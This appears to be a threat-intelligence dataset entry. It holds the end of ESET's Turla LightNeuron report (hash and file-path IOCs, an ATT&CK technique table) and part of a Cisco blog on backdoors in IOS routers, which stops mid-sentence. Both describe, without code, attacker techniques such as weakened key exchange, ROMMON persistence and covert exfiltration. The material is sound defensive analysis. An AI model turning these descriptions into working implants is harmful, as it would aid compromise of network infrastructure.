https://securelist com/apt-trends-report-q2-2018/86487/
.
18
Microsoft, “Transport agents,” 01 06 2016. [Online]. Available:
https://docs microsoft com/en-us/exchange/transport-agents-exchange-2013-help
.
19
Mozilla, “What is the winmail.dat attachment?,” [Online].
Available:
https://support mozilla org/en-US/kb/what-winmaildat-attachment
.
20
Microsoft, “The Z3 Theorem Prover,” [Online]. Available:
https://github com/Z3Prover/z3
.
21
D. Strome, “Configure the Pickup directory and the Replay directory,” 12 08 2016. [Online]. Available:
https://
docs microsoft com/en-us/exchange/configure-the-pickup-directory-and-the-replay-directory-exchange-2013-help
.,Turla LightNeuron
One email away from remote code execution32
22
D. Strome, “Pickup directory and Replay directory,” 08 12 2016. [Online]. Available:
https://docs microsoft com/en-us/exchange/pickup-directory-and-replay-directory-exchange-2013-help
.
23
M. Schlee, “Hackers used Outlook for cyberattack on German government: report,” Politico, 06 03 2018. [Online].
Available:
https://www politico eu/article/report-hackers-used-outlook-for-cyberattack-on-german-government/
.
8.
IOCS
8.1 Hashes
In order to avoid breaking a compromised Microsoft Exchange server, please read the
Cleaning section
before
deleting any of the LightNeuron files.
SHA1 hash
3C851E239FBF67A03E0DAE8F63EEE702B330DB6C
Filename
Microsoft.Exchange.Security.Interop.dll
Component
Transport Agent
Compilation date
26/10/2016
ESET Detection Name
MSIL/Turla.A
SHA1 hash
76EE1802A6C920CBEB3A1053A4EC03C71B7E46F8
Filename
exrwdb.dll
Component
Companion DLL
Compilation date
02/09/2016
ESET Detection Name
Win64/Turla.CC
SHA1 hash
FF28B53B55BC77A5B4626F9DB856E67AC598C787
Filename
Microsoft.Exchange.MessagingPolicies.Search.dll
Component
Transport Agent
Compilation date
16/08/2015
ESET Detection Name
MSIL/Turla.A
SHA1 hash
C1FF6804FDB8656AB08928D187837D28060A552F
Filename
BPA.Transport.dll
Component
Companion DLL
Compilation date
25/07/2014
ESET Detection Name
Win64/Turla.CC
SHA1 hash
F9D52BB5A30B42FC2D1763BE586CEE8A57424732
Filename
Microsoft.Exchange.MessagingPolicies.Search.exe
Component
Transport Agent
Compilation date
20/06/2014
ESET Detection Name
MSIL/Turla.A
SHA1 hash
0A9F10925AF42DF94925D07112F303D57392C908
Filename
BPA.Transport.dll
Component
Companion DLL
Compilation date
01/07/2016
ESET Detection Name
Win64/Turla.CC
SHA1 hash
A4D1A34FE5EFFD90CCB6897679586DDC07FBC5CD
Filename
/
Component
Transport Agent
Compilation date
20/06/2014
ESET Detection Name
MSIL/Turla.A,Turla LightNeuron
One email away from remote code execution33
8.2 Paths
•
%tmp%
\winmail.dat
• C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmocf.xml
• C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmodl.dat
• C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\
Windows\814ad43-58ab-2cd3-3e68-b82a8f402fd0
• C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\
Windows\42cf8a1-6e20-8c24-d35f-82c46d8b70ba
• C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\
Windows\36b1f4a-82b9-eb06-7c1e-90b4b2d5c27d
• C:\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\thumbcache_idx.db
• C:\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Windows\thumbcache_32.db
9.
MITRE ATT&CK TECHNIQUES
TacticIdNameDescription
Initial AccessT1078Valid AccountsAttackers probably re-used stolen credentials
to deploy LightNeuron.
ExecutionT1086PowerShellA PowerShell script was used to install LightNeuron.
Privilege
EscalationT1078Valid AccountsTo have Administrative rights, attackers probably
used stolen credentials.
DiscoveryT1016System Network
Configuration DiscoveryLightNeuron exfiltrates the result of the functions
GetAdaptersInfo and GetComputerName.
CollectionT1119Automated CollectionDepending on the configuration, LightNeuron
can collect the files in a specific path.
T1005Data from Local SystemUsing a backdoor function, attackers can exfiltrate
any local file.
T1114Email CollectionLightNeuron collects all the emails matching one rules
specified in its configuration.
ExfiltrationT1020Automated ExfiltrationDepending on the configuration, LightNeuron
can exfiltrate files located in a specific path.
T1022Data EncryptedData is encrypted using AES.
T1041Exfiltration Over
Command and Control
ChannelData is exfiltratated using an email C&C channel.
T1029Scheduled Transfer Depending on the configuration, automatic exfiltration
can happen during the night or during working hours.
Command
and ControlT1001Data ObfuscationC&C data is hidden in PDF documents or JPG images
using steganography.
T1032Standard Cryptographic
ProtocolC&C data is encrypted using AES.
T1071Standard Application
Layer ProtocolC&C communication uses emails.",['S0395']
https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices,"['enterprise-attack', 'Enterprise']","['defense-evasion', 'persistence', 'command-and-control', 'execution']","['Reduce Key Space', 'Weaken Encryption', 'Traffic Signaling', 'Network Device CLI', 'ROMMONkit', 'Non-Application Layer Protocol', 'Downgrade System Image', 'Modify System Image: Patch System Image']","['T1600.001', 'T1600', 'T1205', 'T1059.008', 'T1542.004', 'T1095', 'T1601.002', 'T1601', 'T1601', 'T1601', 'T1601', 'T1601', 'T1601']","
Evolution of attacks on Cisco IOS devices - Cisco Blogs
Skip to content
Cisco Blogs / Security / Evolution of attacks on Cisco IOS devices
October 8, 2015
8 Comments
Security
Evolution of attacks on Cisco IOS devices
Graham Holmes
While “SYNful Knock” is the latest identified malware targeting Cisco devices running Cisco IOS, we have identified and investigated six other malware incidents during the last four years that target Cisco devices running Cisco IOS. The nature of threats is evolving and Cisco will continue to adapt technology delivering trustworthy solutions that our customers can rely on. This also means that customers will need to evolve, fully utilizing the security tools that are available, as well as ensuring security best practices are in place.
The malware used in these evolved Cisco IOS attacks show increasing levels of complexity in the type of modifications made to Cisco IOS, the behavior of its Command and Control (C&C) network (when present), and the platforms they target.
Before talking about specifics of each investigated malware incident, it is important to note that in all cases, no evidence has been found that attackers exploited a previously known or unknown vulnerability to install the malware. All available data points suggest either the use of compromised administrator credentials or physical access to the devices or images.
The following table and associated description provides a brief overview of the malware samples, as well as an overview of the actions that Cisco took in response to those findings. The source of this information is internal analysis performed by Cisco forensics teams.
Notes to table:
INFECTION METHOD: Static means “modifications to the IOS binary stored in the device’s flash”, Runtime means “modifications performed to the runtime memory code without changes to the IOS binary in flash”
REMOTE DETECTABILITY: refers to the means to remotely look for the presence of the malware on a compromised system through scanning systems and signatures. Other means of detecting modifications through memory analysis is possible in all cases.
Incidents 0 and 1
The first two incidents were detected in 2011 and 2012 respectively, and were most likely custom malware targeting a specific victim. Those incidents were very basic (from a technical point of view) and involve binary patches to a Cisco IOS image. They allowed the modified IOS image file to be installed on the target routers (C3825, C2800nm, and C3845). Devices affected were in the Cisco 2800 and 3800 family of routers. No other Cisco devices were identified as affected by this malware.
The modification essentially affects the Diffie-Hellman key exchange protocol in order to weaken the derived keying material. The result is that with casual inspection the encrypted traffic seems unmodified, but the effect is that an attacker could decrypt protected traffic with less effort than would normally be required.
Platforms implementing Trust Anchor technologies and signed binaries would not be affected by either one of those two malware examples.
Incidents 2 and 3
Two new malware samples were identified in 2013, both targeting the Cisco 7600 series of devices. In both cases, the attacker leveraged compromised administrator credentials to modify the in-memory copy of the Cisco IOS code, using debugging and troubleshooting Cisco IOS command line interface (CLI) commands.
The primary purpose of the added code appears to be exfiltration of IPv4 packets that match criteria set by the attacker. The targeted traffic is copied and those packets are then forwarded to a specified IP address that is under the control of the attacker. A secondary purpose is to provide NAT (Network Address Translation) capabilities, so an attacker is able to access an IPv4 address within a compromised network that would normally not be reachable from the public Internet (ie: devices using RFC-1918 addresses).
Since both of these malware samples involved the modification of the in-memory code for Cisco IOS, neither Trust Anchor technologies nor image validation features would have detected or prevented the attack. But, because the modifications were performed on the in-memory copy of Cisco IOS, neither attack would achieve persistency across device reloads.
Incident 3 has only been detected in a single customer network. It was discovered while troubleshooting crashes on line cards on installed Cisco 7600 devices. Forensic analysis of the associated core dumps found that this attack used a C&C mechanism similar to Incident 2 to provide the malware with instructions for data exfiltration. What is unique in this incident is targeting of multi-architecture line cards – something we have not seen in any other malware analyzed as of this writing.
In both cases, the modifications were made to the in-memory copy of the executable code for the Cisco IOS image (with no changes to the actual binary Cisco IOS image in flash). The use of signed Cisco IOS images would not be a defense. It does, however, highlight the need for strong protection of administrative credentials and authorization mechanisms for privileged access to any network device.
Incident 4
Incident 4 was discovered in late 2014 and affected Cisco 1800, Cisco 3800 and Cisco 7200 devices. Like the malware seen in Incidents 2 and 3, the attack leveraged compromised administrative credentials to gain access to target devices for the purpose of installing the malware.
This malware, however, showed an increase in complexity compared to previous malware analyzed. It is the only analyzed malware so far that is capable of persistence through both device reload as well as through Cisco IOS software upgrades.
The malware has two separate components:
An initial infection, where the ROMMON on the targeted Cisco device is modified to ensure persistence of the C&C channel;
A secondary infection occurs when the ROMMON is used to inject binary code into the in-memory Cisco IOS image to support data exfiltration.
Note: This malware does not modify the binary Cisco IOS image in flash.
The ROMMON component of the malware handles the C&C messages, which are embedded within the payload of ICMP packets delivered through the IPv4 protocol.
The secondary infection component is highly modular, and supports the loading and unloading of optional “modules,” which are delivered to the device through the C&C channel. One of the observed modules purpose is to exfiltrate device-specific data via ICMP packets. This module creates an ICMP Echo Request packet with the data to be exfiltrated as its payload. Other modules provide NAT capabilities, so C&C messages can reach devices that would otherwise not be accessible from the public Internet, and additional exfiltration capabilities for other traffic defined by the attacker.
Like Incident 3, the use of signed IOS images would not prevent this attack, as the binary Cisco IOS image stored in flash is never modified. However, the ROMMON compromise (used to achieve persistence between reloads and Cisco IOS software upgrades) would not be successful with current devices that incorporate secure boot, trust anchor modules, and image signing capabilities.
Incident 5 (SYNful Knock)
The last example (known as SYNful Knock and jointly disclosed by Cisco and Mandiant’s FireEye), uses the same static modifications to the Cisco IOS binary seen in Incidents 0 and 1. It also uses a C&C approach similar to the one observed in Incident 2, but uses TCP instead of ICMP for C&C traffic (hence the name SYNful Knock).
SYNful Knock (like malware #0, #1, #2 and #3) CANNOT survive the installation of a known good Cisco IOS binary image, obtained from a known, trusted source and verified to have the correct hash values.
Cisco actions to prevent and detect attacks against Cisco devices
Since 2008, the Cisco Secure Development Lifecycle framework has provided development teams with standards and requirements to ensure products are designed with protection features and capabilities. Boot time and run time security features, such as Trust Anchor modules, secure boot, and memory protection are standard requirements. The goal of these features is to protect customers from remote code injection attacks or static modifications to Cisco IOS binary images.
As soon as the first malware was detected “in the wild,” forensics and analysis teams at Cisco began accelerating the development of detection capabilities. We’ve developed forensics tools that can quickly validate the authenticity of IOS images from core dumps or in-memory images. These are key tools used in incident response to help our customers confirm whether there is a compromise and the extent of such a compromise.
Concurrently with the development of such forensics tools, we implemented measures to further ensure our supply chain integrity: verifying Cisco IOS image integrity through development, compilation, testing and release, and all the way to distribution points. As part of those efforts, we recently introduced and began posting SHA-512 hash values for any Cisco image to further increase customer confidence on their image authenticity. These are available for customer download on www.cisco.com.
We have also posted instructions and guidance for customers to harden their router authentication, authorization and accounting process and for validating Cisco IOS binary images already installed or to be installed on their Cisco devices.
We’ve deployed tools that automatically analyze core dumps provided by customers to the Cisco Technical Assistance Center (TAC) as part of a Service Request. These tools automatically detect modifications to Cisco IOS images. They also detect malicious and/or counterfeit images by analyzing binary images installed on any Cisco device that come through our RMA process.
We have reviewed all Cisco IOS command line interface (CLI) commands, and have removed commands that provide limited value to customers during normal device operation, but could be misused by attackers with access to the device CLI.
We are in the pilot phase of an image validation service that offers customers the ability to quickly and automatically analyze and detect modified Cisco IOS images running on their Cisco devices.
We have released SNORT and Yara signatures that detect SYNful Knock malware.
We have worked with all customers to quickly address their concerns or help them validate the running images in their network have not been compromised.
What Can You Do?
We have published several documents that can be used by Cisco customers wanting to better understand how to protect their Cisco IOS devices, harden their device configurations (including credential management procedures), and verify binary or in-memory running Cisco IOS images. The following are some of the resources you can find on www.cisco.com:
Cisco IOS Software Integrity Assurance
Cisco Guide to Harden IOS Devices
Telemetry-Based Infrastructure Device Integrity Monitoring
Trust Anchor Technologies on Cisco products
While some of the previously listed measures have been reactive, we are also taking active steps in developing new capabilities to meet the challenges of an ever changing threat landscape. In terms of the attack continuum – protect, detect, recover – Cisco has focused for many years on addressing the challenges of protecting our products through hardening,